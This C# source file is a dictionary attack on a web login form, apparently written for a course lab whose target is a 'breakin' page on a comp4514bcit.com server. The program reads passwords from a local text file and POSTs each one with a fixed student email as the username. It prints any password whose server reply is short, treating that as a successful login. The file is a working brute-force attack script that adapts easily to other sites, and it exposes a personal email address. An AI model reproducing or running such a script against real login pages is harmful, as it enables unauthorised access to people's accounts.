using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace Examples
{
    public class WebRequestPostExample
    {
        public static void Main()
        {
            string username = "dli78@my.bcit.ca";
            string path = @"C:\Users\Don Li\Desktop\breakin_console_app\passwords.txt";

            string text = File.ReadAllText(path);
            string[] pws = text.Split(',');

            hit("Anne", "abc123");
            _ = Console.ReadKey();

            foreach (var pw in pws)
            {
                string _pw = Regex.Replace(pw, @"(\s+|'|')", "");
                if (pw.Trim().Length > 0) hit(username, _pw);
                // Console.ReadKey();
            }


            void hit(string user, string pw)
            {
                // Create a request using a URL that can receive a post. 
                WebRequest request = WebRequest.Create("http://comp4514bcit.com//breakin/welcome.php");
                // Set the Method property of the request to POST.
                request.Method = "POST";


                string postData = $"txtName={user}&txtPwd={pw}";
                byte[] byteArray = Encoding.UTF8.GetBytes(postData);

                // Set the ContentType property of the WebRequest.
                request.ContentType = "application/x-www-form-urlencoded";
                // Set the ContentLength property of the WebRequest.
                request.ContentLength = byteArray.Length;
                // Get the request stream.
                Stream dataStream = request.GetRequestStream();
                // Write the data to the request stream.
                dataStream.Write(byteArray, 0, byteArray.Length);
                // Close the Stream object.
                dataStream.Close();

                // Get the response.
                WebResponse response = request.GetResponse();
                // Display the status.
                // Console.WriteLine(((HttpWebResponse)response).StatusDescription);


                // Get the stream containing content returned by the server.
                dataStream = response.GetResponseStream();
                // Open the stream using a StreamReader for easy access.
                StreamReader reader = new StreamReader(dataStream);
                // Read the content.
                string responseFromServer = reader.ReadToEnd();
                // Display the content.
                // Console.WriteLine(responseFromServer);
                if (responseFromServer.Length < 100) Console.WriteLine(pw);
                

                // Clean up the streams.
                reader.Close();
                dataStream.Close();
                response.Close();
            }

        }
    }
}
